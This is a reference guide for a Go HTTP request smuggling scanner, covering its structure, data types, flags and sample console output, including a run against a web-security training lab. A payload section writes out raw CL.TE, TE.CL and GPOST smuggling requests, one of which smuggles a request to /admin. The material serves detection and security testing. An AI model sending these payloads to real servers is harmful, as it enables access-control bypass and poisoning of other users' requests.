# HTTP Request Smuggling Scanner - Tool Outputs Reference

## Project Structure

```
smuggler/
├── cmd/
│   └── main.go                 # CLI entry point with flag parsing
│
├── internal/
│   ├── sender/
│   │   └── raw_sender.go       # Raw TCP/TLS HTTP sender
│   │
│   ├── payload/
│   │   ├── generator.go        # Fluent payload builder
│   │   ├── cl_te.go            # CL.TE attack generators
│   │   ├── te_cl.go            # TE.CL attack generators
│   │   └── advanced_attacks.go # Multi-request attacks (GPOST)
│   │
│   ├── baseline/
│   │   └── baseline.go         # Baseline capture & comparison
│   │
│   ├── detector/
│   │   └── detector.go         # Confidence scoring & analysis
│   │
│   ├── scanner/
│   │   ├── scanner.go          # Standard single-request scanner
│   │   └── advanced_scanner.go # Multi-request poisoning scanner
│   │
│   └── models/
│       └── result.go           # Data structures
│
├── go.mod                      # Module definition
└── bin/
    └── smuggler                # Compiled binary
```

---

## Data Structures (Go Types)

### 1. HTTPResponse
Represents a raw HTTP response from the server.

```go
type HTTPResponse struct {
    Raw              string            // Full response (headers + body)
    StatusCode       int               // HTTP status (e.g., 200)
    Headers          map[string]string // Parsed headers
    Body             string            // Response body
    TimingMS         int64             // Response time in milliseconds
    ConnectionClosed bool              // Was connection closed?
    Error            error             // Any error during transmission
}
```

**Example HTTPResponse:**
```
Raw: "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n...\r\n\r\n<html>..."
StatusCode: 200
Headers: {"Content-Type": "text/html", "Content-Length": "1234", ...}
Body: "<html>..."
TimingMS: 25
ConnectionClosed: false
Error: nil
```

---

### 2. BaselineComparison
Tracks differences between baseline and test responses.

```go
type BaselineComparison struct {
    Baseline                   *HTTPResponse
    Test                       *HTTPResponse
    StatusCodeChanged          bool
    OldStatusCode              int
    NewStatusCode              int
    TimingDiffMS               int64
    ConnectionBehaviorChanged  bool
    OldConnectionClosed        bool
    NewConnectionClosed        bool
    HeadersAdded               map[string]string
    HeadersRemoved             map[string]string
    HeadersModified            map[string]string
    BodySizeDiff               int
    BodyChanged                bool
    Changes                    []string // Human-readable change list
}
```

**Example BaselineComparison:**
```
StatusCodeChanged: true
OldStatusCode: 200
NewStatusCode: 400
TimingDiffMS: -18
HeadersRemoved: {"Transfer-Encoding": "chunked"}
HeadersAdded: {"Content-Length": "155"}
BodySizeDiff: -385
Changes: [
    "Status code changed: 200 -> 400",
    "Headers removed: [Transfer-Encoding]",
    "Body changed: 540 bytes -> 155 bytes (diff: -385)"
]
```

---

### 3. ScanResult
Final analysis result for a specific attack technique.

```go
type ScanResult struct {
    Target             string           // Target host
    Technique          string           // "CL.TE", "TE.CL", "Mixed-TE", "CL.TE-GPOST"
    Suspicious         bool             // Vulnerability detected?
    Reason             string           // Explanation (multi-line)
    ResponseTimeDiff   int64            // Timing difference (ms)
    BaselineResponse   *HTTPResponse    // For reference
    TestResponse       *HTTPResponse    // For reference
}
```

**Example ScanResult:**
```
Target: "example.com"
Technique: "CL.TE"
Suspicious: true
Reason: 
  "Potential CL.TE vulnerability detected (confidence: 50.0%)
   Detection signals:
     - Backend returned 400 (malformed request detection)
     - Response body 385 bytes smaller (possible content absorption)
     - Transfer-Encoding header removed by backend
   
   Technique: Proxy trusts Content-Length, backend trusts Transfer-Encoding.
   The server may have desynchronized request boundaries..."
ResponseTimeDiff: -18
```

---

### 4. DetectionReport
Aggregated results from all tests.

```go
type DetectionReport struct {
    Target                string
    TotalTests            int
    Vulnerable            int
    Suspicious            []*ScanResult    // Vulnerable techniques
    NonSuspicious         []*ScanResult    // Clean techniques
    HighestConfidence     float64
    MostLikelyTechnique   string
}
```

**Example DetectionReport:**
```
Target: "0a8f006903f8785181c8b1a200d20006.web-security-academy.net"
TotalTests: 1
Vulnerable: 1
MostLikelyTechnique: "CL.TE-GPOST"
Suspicious: [ScanResult{Technique: "CL.TE-GPOST", Suspicious: true, ...}]
```

---

## CLI Output Examples

### Standard Mode - Vulnerable Server

```bash
$ ./bin/smuggler -target example.com -port 80 -v
```

**Output:**
```
[+] Confidence threshold: 50.0%

============================================================
HTTP REQUEST SMUGGLING SCANNER
Target: example.com:80
============================================================

[*] Capturing baseline response for example.com:80
    Status: 200 | Timing: 34 ms | Headers: 11 | Body: 540 bytes

[*] Testing CL.TE (Content-Length / Transfer-Encoding)...
    Response: 400 | Timing: 10 ms
    Result: SUSPICIOUS ✗

[*] Testing TE.CL (Transfer-Encoding / Content-Length)...
    Response: 400 | Timing: 10 ms
    Result: CLEAN ✓

[*] Testing Mixed-TE (Multiple Transfer-Encoding headers)...
    Response: 400 | Timing: 11 ms
    Result: CLEAN ✓

============================================================
=== DETECTION REPORT ===
Target: example.com
Tests conducted: 3
Vulnerable techniques: 1

VULNERABLE FINDINGS:

1. CL.TE
Potential CL.TE vulnerability detected (confidence: 50.0%)
Detection signals:
  - Backend returned 400 (malformed request detection)
  - Response body 385 bytes smaller (possible content absorption)
  - Transfer-Encoding header removed by backend

Technique: Proxy trusts Content-Length, backend trusts Transfer-Encoding.
The server may have desynchronized request boundaries, allowing request smuggling.
============================================================

Target: example.com:80
Tests run: 3
Vulnerable: 1
Most likely: CL.TE
Status: VULNERABLE ✗

[!] VULNERABLE SERVER DETECTED
[!] Most likely technique: CL.TE
```

---

### Standard Mode - Clean Server

```bash
$ ./bin/smuggler -target cloudflare.com -port 80
```

**Output:**
```
============================================================
HTTP REQUEST SMUGGLING SCANNER
Target: cloudflare.com:80
============================================================

[*] Capturing baseline response for cloudflare.com:80
    Status: 200 | Timing: 45 ms | Headers: 9 | Body: 2340 bytes

[*] Testing CL.TE (Content-Length / Transfer-Encoding)...
    Response: 200 | Timing: 42 ms
    Result: CLEAN ✓

[*] Testing TE.CL (Transfer-Encoding / Content-Length)...
    Response: 200 | Timing: 43 ms
    Result: CLEAN ✓

[*] Testing Mixed-TE (Multiple Transfer-Encoding headers)...
    Response: 200 | Timing: 44 ms
    Result: CLEAN ✓

============================================================
=== DETECTION REPORT ===
Target: cloudflare.com
Tests conducted: 3
Vulnerable techniques: 0

No vulnerabilities detected.
============================================================

Target: cloudflare.com:80
Tests run: 3
Vulnerable: 0
Status: CLEAN ✓

[✓] No vulnerabilities detected
```

---

### Advanced Mode - GPOST Attack (Web Security Academy Lab)

```bash
$ ./bin/smuggler -target 0a8f006903f8785181c8b1a200d20006.web-security-academy.net \
    -port 443 -https -insecure -advanced -v
```

**Output:**
```
[+] Confidence threshold: 50.0%
[+] Using HTTPS/TLS
[+] WARNING: TLS certificate verification disabled
[+] Using advanced multi-request scanner

============================================================
HTTP REQUEST SMUGGLING SCANNER (ADVANCED MODE)
Target: 0a8f006903f8785181c8b1a200d20006.web-security-academy.net:443
============================================================

[*] Capturing baseline response for 0a8f006903f8785181c8b1a200d20006.web-security-academy.net:443
    Status: 200 | Timing: 657 ms | Headers: 5 | Body: 8065 bytes

[*] Testing CL.TE GPOST poisoning (multi-request attack)...
    [1] Sending smuggling payload...
        Response: 200 | Timing: 628 ms
    [2] Sending probe request after smuggling...
        Response: 403 | Timing: 611 ms
    [3] Analyzing probe response for poisoning...
        ✗ SUSPICIOUS: Response mentions unrecognized method
    Result: SUSPICIOUS ✗
    Response Body Preview:
"Unrecognized method GGET"

============================================================
=== DETECTION REPORT ===
Target: 0a8f006903f8785181c8b1a200d20006.web-security-academy.net
Tests conducted: 1
Vulnerable techniques: 1

VULNERABLE FINDINGS:

1. CL.TE-GPOST
Probe response indicates unrecognized method - likely poisoned request
============================================================

Target: 0a8f006903f8785181c8b1a200d20006.web-security-academy.net:443
Tests run: 1
Vulnerable: 1
Most likely: CL.TE-GPOST
Status: VULNERABLE ✗

[!] VULNERABLE SERVER DETECTED
[!] Most likely technique: CL.TE-GPOST
```

---

## Payload Examples

### CL.TE Payload
```
POST / HTTP/1.1
Host: example.com:80
Connection: close
Transfer-Encoding: chunked
Content-Length: 6

5
0

0

GET /admin HTTP/1.1
Host: example.com

```

### TE.CL Payload
```
POST / HTTP/1.1
Host: example.com:80
Connection: close
Content-Length: 5
Transfer-Encoding: chunked

0

GET /api HTTP/1.1
Host: example.com

```

### GPOST Attack Payload
```
POST / HTTP/1.1
Host: target.com:443
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

---

## HTTP Response Parsing Example

**Raw HTTP Response:**
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 1234
cf-cache-status: HIT
CF-RAY: abc123

<!DOCTYPE html>
<html>
  <body>Example Domain</body>
</html>
```

**Parsed into HTTPResponse:**
```go
StatusCode: 200
Headers: {
    "Content-Type": "text/html",
    "Content-Length": "1234",
    "cf-cache-status": "HIT",
    "CF-RAY": "abc123"
}
Body: "<!DOCTYPE html>\n<html>\n  <body>Example Domain</body>\n</html>"
TimingMS: 45
```

---

## Scanner Features by Mode

| Feature | Standard | Advanced | Details |
|---------|----------|----------|---------|
| **HTTP/HTTPS** | ✅ | ✅ | Both TCP and TLS support |
| **CL.TE Detection** | ✅ | ✅ | Content-Length/Transfer-Encoding |
| **TE.CL Detection** | ✅ | ✅ | Transfer-Encoding/Content-Length |
| **Mixed-TE Detection** | ✅ | ❌ | Multiple TE headers |
| **GPOST Detection** | ❌ | ✅ | Request poisoning (multi-request) |
| **Probe Requests** | ❌ | ✅ | Follow-up detection requests |
| **Response Analysis** | Status/Headers/Timing | Content inspection | How differences detected |
| **Confidence Scoring** | Signal-based (0-1.0) | Content matching | "Unrecognized method" etc |

---

## Exit Codes

- **0**: Scan completed (may or may not find vulnerabilities)
- **1**: Error during execution (invalid args, network error, etc.)

---

## All CLI Flags

```bash
./bin/smuggler [flags]

Flags:
  -target string
        Target host to scan (default "example.com")
  -port int
        Target port (default 80)
  -confidence float
        Minimum confidence threshold 0.0-1.0 (default 0.5)
  -https
        Use HTTPS/TLS connection
  -insecure
        Skip TLS certificate verification (lab/testing only)
  -advanced
        Use advanced multi-request detection (for GPOST attacks)
  -v
        Verbose output
  -h
        Show this help
```

---

## Key Output Indicators

### Status Symbols
- ✅ **CLEAN / ✓** - No vulnerability detected
- ❌ **SUSPICIOUS / ✗** - Vulnerability likely detected
- ~ **UNCLEAR** - Inconclusive findings

### Headers in Output
- `[*]` - Action/step marker
- `[+]` - Configuration/info message
- `[!]` - Important finding or error
- `[✓]` - Success/confirmed clean
- `[✗]` - Vulnerability/confirmation

---

## Verbose vs Non-Verbose Output

**Without `-v` flag:**
- Shows scan progress
- Shows final report
- Shows summary
- Shows vulnerability verdict

**With `-v` flag:**
- Adds configuration details
- Shows confidence threshold
- Shows TLS status warnings
- Shows scanner mode info

---

## Summary

The tool outputs:

1. **Console Output** (human-readable) - Real-time scan progress + detailed findings
2. **Data Structures** (programmatic) - ScanResult, DetectionReport, HTTPResponse objects
3. **Detection Signals** - Confidence-based scoring with detailed reasoning
4. **Response Analysis** - Headers, body content, timing comparisons

All outputs are designed for both human review and programmatic integration.
